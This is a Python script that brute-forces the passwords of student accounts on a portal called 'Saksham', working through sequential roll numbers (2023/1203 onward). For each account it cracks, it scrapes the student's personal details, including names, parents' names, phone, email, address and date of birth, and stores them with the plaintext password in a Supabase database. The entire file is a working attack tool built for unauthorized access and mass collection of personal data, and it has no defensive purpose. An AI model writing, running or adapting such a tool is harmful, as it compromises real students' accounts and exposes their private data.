from database.supabase_student_database import *
from script.http_scripts import *
import time
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("main")


class MainFilter(logging.Filter):
    def filter(self, record):
        return record.name == 'main'


for handler in logging.getLogger().handlers:
    handler.addFilter(MainFilter())


def main():
    database = SupabaseStudentDatabase()

    for i in range(1203, 1300):

        formatted = '{0:04}'.format(i)
        userid = "2023/" + formatted

        try:
            if database.getStudentData(userid) is not None:
                print(f"{userid} password already exist in database/being cracked")
                logger.info(f"{userid} password already exist in database/being cracked")
            else:
                print(f"{userid} password not found in database")
                logger.info(f"{userid} password not found in database")

                # Working status set in database
                working_dict = {
                    "password": "working...",
                    "roll": userid,
                }
                database.addStudentData(userid, data=working_dict)

                start_time = time.perf_counter()

                print("Cracking...")
                logger.info("Cracking...")
                password = bruteforceLogin(userid, 1000)
                end_time = time.perf_counter()
                elapsedTime = str(end_time - start_time)[:8]

                if password is None:

                    # null student set in database
                    null_dict = {
                        "time_taken": elapsedTime,
                        "password": None
                    }
                    database.addStudentData(userid, null_dict)

                else:
                    print("Password found: " + password)
                    logger.info("Password found: " + password)
                    student = getStudentDataFromSaksham(userid, password)

                    # Names are scraped in  uppercase from saksham dashboard
                    student_name = student.student_name.lower
                    mother_name = student.mother_name.lower
                    father_name = student.father_name.lower

                    student_dict = {
                        "password": password,
                        "time_taken": elapsedTime,
                        "student_name": student_name,
                        "father_name": father_name,
                        "mother_name": mother_name,
                        "phone": student.phone,
                        "category": student.category,
                        "email": student.email,
                        "roll": student.roll,
                        "address": student.address,
                        "dob": student.dob,
                        "gender": student.gender,
                        "student_id": student.student_id,
                        "session": student.session,
                        "enrollment_no": student.enrollment_no,
                        "admission_date": student.admission_date,
                        "student_type": student.student_type,
                    }
                    database.addStudentData(userid, student_dict)
                    print(f"{userid} data retrieved and added to database")
                    logger.info(f"{userid} data retrieved and added to database")

        except Exception as e:
            print(f"Error: {e}")
            logger.error(f"Error: {e}")


if __name__ == "__main__":
    main()
